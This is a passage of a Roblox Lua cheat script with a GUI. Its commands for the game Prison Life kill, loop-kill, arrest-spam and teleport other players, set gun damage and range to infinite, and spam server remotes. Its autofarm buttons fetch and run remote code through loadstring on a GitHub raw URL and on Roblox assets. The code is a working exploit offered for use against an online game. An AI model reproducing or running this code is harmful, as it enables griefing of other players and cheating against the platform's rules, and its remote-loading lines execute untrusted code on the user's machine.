								Req["MaxAmmo"] = Req["MaxAmmo"]
								Req["StoredAmmo"] = Req["StoredAmmo"]
								Req["AmmoPerClip"] = Req["AmmoPerClip"]
								Req["CurrentAmmo"] = Req["CurrentAmmo"]
								Req["FireRate"] = -math.huge
								Req["Bullets"] = 25
								Req["Range"] = math.huge
								Req["Damage"] = math.huge
								Req["ReloadTime"] = -math.huge
								Req["AutoFire"] = true
							end
						end
					end
				end)
			end
		end
		if Command("autorapidfire") then
			States.Auto_RapidFire = true
			Notify("Turn auto rapid fire on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				game.Players.LocalPlayer.Character.ChildAdded:Connect(function(Item)
					if States.Auto_RapidFire then
						local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
						local Name
						local Req
						if Tool then
							States.CAN = true
							Name = Tool.Name
							if Tool:FindFirstChild("GunStates") then
								Req = require(Tool.GunStates)
								Req["MaxAmmo"] = Req["MaxAmmo"]
								Req["StoredAmmo"] = Req["StoredAmmo"]
								Req["AmmoPerClip"] = Req["AmmoPerClip"]
								Req["CurrentAmmo"] = Req["CurrentAmmo"]
								Req["FireRate"] = -math.huge
								Req["Bullets"] = 25
								Req["Range"] = math.huge
								Req["Damage"] = math.huge
								Req["ReloadTime"] = -math.huge
								Req["AutoFire"] = true
							end
						end
						while wait() do
							pcall(function()
								if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
									if Req["CurrentAmmo"] < 1 then
										Tool:Destroy()
										workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
										Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
										if Tool then
											Name = Tool.Name
											Tool.Parent = game.Players.LocalPlayer.Character
											Tool = game.Players.LocalPlayer.Character[Name]
											Req = require(Tool.GunStates)
											Req["MaxAmmo"] = Req["MaxAmmo"]
											Req["StoredAmmo"] = Req["StoredAmmo"]
											Req["AmmoPerClip"] = Req["AmmoPerClip"]
											Req["CurrentAmmo"] = Req["CurrentAmmo"]
											Req["FireRate"] = -math.huge
											Req["Bullets"] = 25
											Req["Range"] = math.huge
											Req["Damage"] = math.huge
											Req["ReloadTime"] = -math.huge
											Req["AutoFire"] = true
										end
									end
								end
							end)
						end
					end
				end)
			end)
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			else
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
		end
		if Command("unautorapidfire") then
			States.Auto_RapidFire = false
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			else
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
			Notify("Turn auto rapid fire off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("notifybar") then
			Background4.Visible = true
		end
		if Command("loopbring") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Notify("Looping bring "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
				States.PlayerToLoopBring = Player
				States.LoopBring = true
				repeat wait()
					pcall(function()
						if States.LoopBring and game.Players[States.PlayerToLoopBring.Name] then
							local savedcf = GetPos()
							Teleport(States.PlayerToLoopBring, GetPos())
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
						end
					end)
				until States.LoopBring == false
			end
		end
		if Command("unloopbring") then
			States.LoopBring = false
			States.PlayerToLoopBring = nil
			Notify("Unlooping bring", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("admin") or Command("giveadmin") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not Admin[Player.UserId] then
				Admin[Player.UserId] = {Player = Player}
				Chat("/w "..Player.Name.." You've got admin permissions! Type "..Prefix.."cmds or "..Prefix.."cmd to see all commands")
				Notify("Gave "..Player.Name.." admin commands", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("unadmin") or Command("removeadmin") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and Admin[Player.UserId] then
				Admin[Player.UserId] = nil
				Chat("/w "..Player.Name.." You are bad you've been removed admin permissions")
				Notify("Removed admins from "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("baseballbat") or Command("bat") then
			local LocalPlayer = game.Players.LocalPlayer
			local Character = LocalPlayer.Character
			local Backpack = LocalPlayer.Backpack
			local Humanoid = Character.Humanoid
			if not Backpack:FindFirstChild("Bat") or not Backpack:FindFirstChild("Bat") then
				local BaseBallBat = Instance.new("Tool", Backpack)
				local Handle = Instance.new("Part", BaseBallBat)
				BaseBallBat.GripPos = Vector3.new(0, -1.15, 0)
				BaseBallBat.Name = "Bat"
				Handle.Name = "Handle"
				Handle.Size = Vector3.new(0.4, 5, 0.4)
				local Animation =Instance.new("Animation", BaseBallBat)
				Animation.AnimationId = "rbxassetid://218504594"
				local Track = Humanoid:LoadAnimation(Animation)
				local Cooldown = false
				local Attacked = false
				local Attacking = false
				BaseBallBat.Equipped:Connect(function()
					BaseBallBat.Activated:Connect(function()
						if not Cooldown then
							Cooldown = true
							Attacking = true
							Track:Play()
							Handle.Touched:Connect(function(Hit)
								if Hit.Parent and Hit.Parent ~= game.Players.LocalPlayer and not Attacked and Attacking then
									Attacked = true
									for i = 1,15 do
										game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
									end
								end
							end)
							wait(0.25)
							Cooldown = false
							Attacked = false
							Attacking = false
						end
					end)
				end)
			end
			Notify("Obtained base ball bat", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("tools") or Command("tool") or Command("btool") or Command("btools") then
			local Backpack = game.Players.LocalPlayer.Backpack
			local Character = game.Players.LocalPlayer.Character
			if not Backpack:FindFirstChild("Bin_1") and not Character:FindFirstChild("Bin_1") then
				local HopperBin_1 = Instance.new("HopperBin", Backpack)
				HopperBin_1.BinType = 1
				HopperBin_1.Name = "Bin_1"
			end
			if not Backpack:FindFirstChild("Bin_2") and not Character:FindFirstChild("Bin_2") then
				local HopperBin_2 = Instance.new("HopperBin", Backpack)
				HopperBin_2.BinType = 2
				HopperBin_2.Name = "Bin_2"
			end
			if not Backpack:FindFirstChild("Bin_3") and not Character:FindFirstChild("Bin_3") then
				local HopperBin_3 = Instance.new("HopperBin", Backpack)
				HopperBin_3.BinType = 3
				HopperBin_3.Name = "Bin_3"
			end
			if not Backpack:FindFirstChild("Bin_4") and not Character:FindFirstChild("Bin_4") then
				local HopperBin_4 = Instance.new("HopperBin", Backpack)
				HopperBin_4.BinType = 4
				HopperBin_4.Name = "Bin_4"
			end
			loadstring(game:GetObjects("rbxassetid://552440069")[1].Source)()
			Notify("Obtained btools", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("test") then
			local savedcf = GetPos()
			local CrimPad = workspace["Criminals Spawn"].SpawnLocation
			local padcf = CrimPad.CFrame
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
			wait()
			CrimPad.CFrame = GetPos()
			CrimPad.CanCollide = false
			CrimPad.Transparency = 1.000
			CrimPad.Anchored = true 
			pcall(function()
				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
					end
				end
				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
					end
				end
			end)
			workspace.Remote.loadchar:InvokeServer()
			CrimPad.Transparency = 0.000
			CrimPad.CFrame = padcf
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			Notify("???", Color3.fromRGB(0, 0, 0), "LOL")
		end
		if Command("antilag") or Command("boostfps") then
			States.BoostFps = true
			Notify("Turn anti lag on", Color3.fromRGB(0, 255, 0), "Success")
			for _, v in pairs(game:GetDescendants()) do
				pcall(function()
					v.Material = Enum.Material.Plastic
					States[v.Name] = {Material = v.Material}
				end)
			end
			while wait() do
				if States.BoostFps then
					for i,v in pairs(game.Players:GetChildren()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health < 1 then
									v.Character:Destroy()
								end
							end)
						end
					end
				end
			end
		end
		if Command("unantilag") then
			States.BoostFps = false
			Notify("Turn anti lag off", Color3.fromRGB(0, 255, 0), "Success")
			for _, v in pairs(game:GetDescendants()) do
				pcall(function()
					v.Material = States[v.Name].Material
				end)
			end
		end
		if Command("serverhop") or Command("newserver") or Command("changeserver") then
			Notify("Changing server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
		if Command("nexus") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
		end
		if Command("cafe") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(877, 100, 2256)
		end
		if Command("backnexus") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(982, 100, 2334)
		end
		if Command("yard") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(791, 98, 2498)
		end
		if Command("crimbase") or Command("criminalbase") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2055)
		end
		if Command("armory") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(789, 100, 2260)
		end
		if Command("lunchroom") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(905, 100, 2226)
		end
		if Command("gate") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(505, 103, 2250)
		end
		if Command("tower") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(822, 131, 2588)
		end
		if Command("gatetower") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(502, 126, 2306)
		end
		if Command("sewer") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916, 79, 2311)
		end
		if Command("makecrimall") then
			local savedcf = GetPos()
			local CrimPad = workspace["Criminals Spawn"].SpawnLocation
			local padcf = CrimPad.CFrame
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
			wait()
			CrimPad.CFrame = GetPos()
			CrimPad.CanCollide = false
			CrimPad.Transparency = 1.000
			CrimPad.Anchored = true
			repeat wait() 
				pcall(function()
					for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							Teleport(v, CrimPad.CFrame)
						end
					end
					for i,v in pairs(game.Teams.Guards:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							Teleport(v, CrimPad.CFrame)
						end
					end
				end)
			until #game.Teams.Criminals:GetPlayers() == (#game.Players:GetPlayers()-#game.Teams.Neutral:GetPlayers())
			workspace.Remote.loadchar:InvokeServer()
			CrimPad.Transparency = 0.000
			CrimPad.CFrame = padcf
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			Notify("Make everyone crimmed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("bringall") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					Teleport(v, GetPos())
				end
			end
			Notify("Broght all", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("notify") then
			States.Notify = true
			Notify("Notify on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nonotify") then
			States.Notify = false
			Notify("Notify off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if PrefixCommand("getprefix") then
			Chat("Prefix : "..Prefix)
			Notify("Prefix : "..Prefix, Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("cmd") or Command("cmds") then
			if Background.Visible == true then
				Background.Visible = false
			else
				Background.Visible = true
			end
			Notify("Showed Commands", Color3.fromRGB(0, 255, 0), "Success")
		end

	end

	function AdminPlayerChatted(Message, Player)
		Split = Message:split(" ")
		Arg1 = Split[1]
		Arg2 = Split[2]
		Arg3 = Split[3]
		Arg4 = Split[4]
		if Command("nexus") then
			Teleport(Player, CFrame.new(888, 100, 2388))
		end
		if Command("cafe") then
			Teleport(Player, CFrame.new(877, 100, 2256))
		end
		if Command("backnexus") then
			Teleport(Player,  CFrame.new(982, 100, 2334))
		end
		if Command("armory") then
			Teleport(Player, CFrame.new(789, 100, 2260))
		end
		if Command("tower") then
			Teleport(Player, CFrame.new(822, 131, 2588))
		end
		if Command("crimbase") or Command("criminalbase") then
			Teleport(Player, CFrame.new(-942, 94, 2055))
		end
		if Command("bring") then
			TeleportV(GetPlayer(Arg2), Player)
		end
		if Command("void") then
			Teleport(GetPlayer(Arg2), CFrame.new(99999, 99999, 99999))
		end
		if Command("beam") then
			Beam(GetPlayer(Arg2), math.huge, 1)
		end
		if Command("yard") then
			Teleport(Player, CFrame.new(791, 98, 2498))
		end
		if Command("disconnect") then
			States.Disconnect = true
			while wait() do
				if States.Disconnect then
					coroutine.wrap(function()
						pcall(function()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

							local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

							local args = {
								[1] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [2] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [3] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [4] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [5] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [6] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [7] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [8] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}
							}

							game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
						end)
					end)()
				end
			end
		end
		if Command("undisconnect") then
			States.Disconnect = false
		end
		if Command("spamarrest") then
			local GP = GetPlayer(Arg2)
			if GP then
				States.SpamArrest2 = true
				repeat wait()
					local Time = 0
					pcall(function()
						if GP.TeamColor.Name == "Bright orange" then
							Teleport(GP, GetPos())
							repeat wait(.01)
								Time = Time + 1
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = GP.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								workspace.Remote.arrest:InvokeServer(GP.Character.Head)
							until GP.Character.Head:FindFirstChild("handcuffedGui") or Time >= 250
							if GP.Character.Head:FindFirstChild("handcuffedGui") then
								Arrest(GP, 10000)
							end
						end
						if GP.TeamColor.Name ~= "Really red" and not GP.Character.Head:FindFirstChild("handcuffedGui") then
							if not States.SpamArrest2 then return end
							repeat Teleport(GP, CFrame.new(-919, 96, 2138)) until GP.TeamColor.Name == "Really red" or not States.SpamArrest2 or not game.Players[GP.Name]
						end
						wait(.1)
						if not GP.Character.Head:FindFirstChild("handcuffedGui") then
							Arrest(GP, 10000)
						end
					end)
				until not States.SpamArrest2 or not game.Players[GP.Name]
			end
		end
		if Command("unspamarrest") then
			States.SpamArrest2 = false
		end
		if Command("killguard") or Command("killguards") then
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killinmate") or Command("killinmates") then
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killcriminal") or Command("killcriminals") then
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killall") or Command("killothers") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("kill") or Command("kills") then
			Kill(GetPlayer(Arg2))
		end
		if Command("loopkill") or Command("loopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = {Player = Player}
			end
		end
		if Command("unloopkill") or Command("unloopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = nil
			end
		end
		if Command("tase") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Tase(Player)
			end
		end
		if Command("makecrim") then
			Teleport(GetPlayer(Arg2), CFrame.new(-919, 96, 2138))
		end
		if Command("arrest") then
			Arrest(GetPlayer(Arg2))
		end
		if Command("crim") then
			Teleport(Player, CFrame.new(-919, 96, 2138))
		end
		if Command("goto") or Command("to") then
			TeleportV(Player, GetPlayer(Arg2))
		end
		if Command("cmd") or Command("cmds") then
			Chat("/w "..Player.Name.." "..Prefix.."goto [plr] "..Prefix.."to [plr] "..Prefix.."kill [plr] "..Prefix.."kills [plr] "..Prefix.."makecrim [plr] "..Prefix.."arrest [plr] "..Prefix.."tase [plr] "..Prefix.."loopkill [plr] "..Prefix.."unloopkill [plr]") wait(.1)
			Chat("/w "..Player.Name.." "..Prefix.."crim "..Prefix.."tower "..Prefix.."nexus "..Prefix.."backnexus "..Prefix.."cafe "..Prefix.."armory "..Prefix.."bring [plr]") wait(.1)
			Chat("/w "..Player.Name.." "..Prefix.."killall "..Prefix.."killothers "..Prefix.."killinmate "..Prefix.."killinmates "..Prefix.."killguard "..Prefix.."killguards "..Prefix.."killcriminals "..Prefix.."killcriminal "..Prefix.."void [plr]")
			Chat("/w "..Player.Name.." "..Prefix.."spamarrest [plr] "..Prefix.."unspamarrest "..Prefix.."disconnect "..Prefix.." "..Prefix.."beam [plr]")
			Chat("/w "..Player.Name.." "..Prefix.."cmd "..Prefix.."cmds") wait(.1)
		end
	end

	game.Players.LocalPlayer.Chatted:Connect(PlayerChatted)

	spawn(function()
		while wait() do
			for i,v in pairs(LoopKill) do
				pcall(function()
					if v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.Humanoid.Health ~= 0 then
						Kill(v.Player)
					end
				end)
			end
		end
	end)

	spawn(function()
		while wait() do
			for i,v in pairs(LoopBeam) do
				pcall(function()
					if v and v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.HumanoidRootPart then
						Beam(v.Player, math.huge, 1)
					end
				end)
			end
		end
	end)

	spawn(function()
		while wait() do
			if States.Fast_Punch == true then
				pcall(function()
					getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isFighting = false
				end)
			end
		end
	end)

	coroutine.wrap(function()
		while wait() do
			if States.Kill_Aura then
				for i,v in pairs(game.Players:GetPlayers()) do
					pcall(function()
						if v ~= game.Players.LocalPlayer then
							local Distance = (v.Character:FindFirstChildOfClass("Part").Position - game.Players.LocalPlayer.Character:FindFirstChildOfClass("Part").Position).magnitude
							if Distance <= 10 then
								for i = 1,25 do
									game.ReplicatedStorage.meleeEvent:FireServer(v)
								end
							end
						end
					end)
				end
			end
		end
	end)()

	function CheckPermissions(Player)
		Player.Chatted:Connect(function(Message)
			if Admin[Player.UserId] then
				AdminPlayerChatted(Message, Player)
			end
		end)
	end

	game.Players.PlayerRemoving:Connect(function(Player)
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Rage Quit",
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
		if States.ChatNotify then
			Chat(Player.DisplayName.." Rage Quit")
		end
	end)

	game.Players.PlayerAdded:Connect(function(Player)
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Joined",
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
		if States.ChatNotify then
			Chat(Player.DisplayName.." Joined The Server")
		end
		CheckPermissions(Player)
		CopyChat(Player)
		Died(Player)
		PlayerPickUp(Player)
	end)

	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= game.Players.LocalPlayer then
			CheckPermissions(v)
			CopyChat(v)
			Died(v)
			PlayerPickUp(v)
		end
	end

	game.Players.LocalPlayer.CharacterAdded:Connect(function()
		States.CAN = false
	end)

	FindCmd.Changed:Connect(function()
		if FindCmd.Text ~= "" then
			for i,v in pairs(CmdHandler:GetChildren()) do
				if v:IsA("TextButton") then
					if not string.lower(v.Text):match(string.lower(FindCmd.Text)) then
						v.Parent = Background
						v.Visible = false
					end
				end
			end
			for i,v in pairs(Background:GetChildren()) do
				if v.Name == "COMMANDS" then
					if string.lower(v.Text):match(string.lower(FindCmd.Text)) then
						v.Parent = CmdHandler
						v.Visible = true
					end
				end
			end
		elseif FindCmd.Text == "" and (#CmdHandler:GetChildren()-1) ~= #Cmd  then
			for i,v in pairs(CmdHandler:GetChildren()) do
				if v:IsA("TextButton") then
					v:Destroy()
				end
			end
			for i,v in pairs(Background:GetChildren()) do
				if v.Name == "COMMANDS" then
					v:Destroy()
				end
			end
			for i = 1,#Cmd do
				local clone = CmdText:Clone()
				clone.Text = Cmd[i].Text
				clone.Name = "COMMANDS"
				local Ins = Instance.new("StringValue", clone)
				Ins.Name = "Title"
				Ins.Value = Cmd[i].Title
				local Ins2 = Instance.new("StringValue", clone)
				Ins2.Name = "TopbarName"
				Ins2.Value = Cmd[i].Text:split(" ")[1]
				clone.Parent = CmdHandler
				clone.MouseButton1Click:Connect(function()
					Execute:CaptureFocus()
					Execute.Text = clone.Text:split(" ")[1]
					Execute.CursorPosition = #Execute.Text + 1
				end)
			end
		end
	end)

	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(Key)
		if Key == Prefix then
			if Prefix ~= "/" then
				Execute:CaptureFocus()
			end
		end
	end)

	Execute.FocusLost:Connect(function(FocusLost)
		if FocusLost then
			if Execute.Text:sub(1,#Prefix) ~= Prefix then
				PlayerChatted(Prefix..Execute.Text)
			else
				PlayerChatted(Execute.Text)
			end
		end
	end)

	getgenv().DisableScript = function()
		pcall(function()
			CmdGui:Destroy()
			States = {}
			LoopKill = {}
			LoopTase = {}
			Admin = {}
			ScriptDisabled = true
			for i,v in pairs(game.Lighting:GetChildren()) do
				v.Parent = workspace
			end
		end)
	end
end)

UICorner_8.Parent = PrisonLife

Breakin.Name = "Breakin"
Breakin.Parent = Scripts
Breakin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Breakin.Position = UDim2.new(0, 0, 0.0413031131, 0)
Breakin.Size = UDim2.new(0, 71, 0, 50)
Breakin.Font = Enum.Font.SciFi
Breakin.Text = "Break In"
Breakin.TextColor3 = Color3.fromRGB(0, 0, 0)
Breakin.TextScaled = true
Breakin.TextSize = 14.000
Breakin.TextWrapped = true
Breakin.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RubyBoo4life/break-in-v1/main/.gitignore"))()
end)
UICorner_9.Parent = Breakin

BABFT.Name = "BABFT"
BABFT.Parent = Scripts
BABFT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BABFT.Position = UDim2.new(0.565737069, 0, -0.000609687995, 0)
BABFT.Size = UDim2.new(0, 71, 0, 50)
BABFT.Font = Enum.Font.SciFi
BABFT.Text = "BABFT"
BABFT.TextColor3 = Color3.fromRGB(0, 0, 0)
BABFT.TextScaled = true
BABFT.TextSize = 1.000
BABFT.TextWrapped = true
BABFT.MouseButton1Click:connect(function()
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local ui = loadstring(game:GetObjects("rbxassetid://4133667265")[1].Source)("Library by wally")
	local w = ui:CreateWindow('Automated')
	w:Section('Autofarms')
	local b = w:Button("Autofarm (Forever)", function()
		print("Autofarm Activated (Forever)")
		vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
			vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			wait(1)
			vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		end)
		print("Anti-Afk Succes!")
		while true do
			spawn(function()
				game:getService("RunService"):BindToRenderStep("NoClip",0,function()
					pcall(function()
						if not game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid") then return end
						if not running == true then return end
						game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid"):ChangeState(11)
					end)
				end)
			end)

			local checks = workspace.BoatTerrains:getDescendants()
			for i=1,#checks do
				running = true
				if checks[i].Name == "DarknessPart" or checks[i].Name == "GatePart" then
					checks[i].Transparency = 0
					if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = checks[i].CFrame
					end
					wait(0.42)
				end
			end

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
			repeat
				if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
					game.Players.LocalPlayer.Character.Humanoid.Jump = true
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
				end
				wait()
			until not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
			running = false
			wait()
		end
	end)
	local b = w:Button("Autofarm (Once)", function()
		print("Autofarm Activated (Once)")
		spawn(function()
			game:getService("RunService"):BindToRenderStep("NoClip",0,function()
				pcall(function()
					if not game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid") then return end
					if not running == true then return end
					game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid"):ChangeState(11)
				end)
			end)
		end)

		local checks = workspace.BoatTerrains:getDescendants()
		for i=1,#checks do
			running = true
			if checks[i].Name == "DarknessPart" or checks[i].Name == "GatePart" then
				checks[i].Transparency = 0
				if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = checks[i].CFrame
				end
				wait(0.42)
			end
		end

		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
		repeat
			if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
			end
			wait()
		until not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
		running = false
	end)
	local b = w:Button("Autofarm Treasure (Forever)", function()
		print("Autofarm Treasure Activated (Forever)")
		vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
			vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			wait(1)
			vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		end)
		print("Anti-Afk Succes!")
		while true do
			spawn(function()
				game:getService("RunService"):BindToRenderStep("NoClip",0,function()
					pcall(function()
						if not game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid") then return end
						if not running == true then return end
						game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid"):ChangeState(11)
					end)
				end)
			end)

			local checks = workspace.BoatTerrains:getDescendants()
			for i=1,#checks do
				running = true
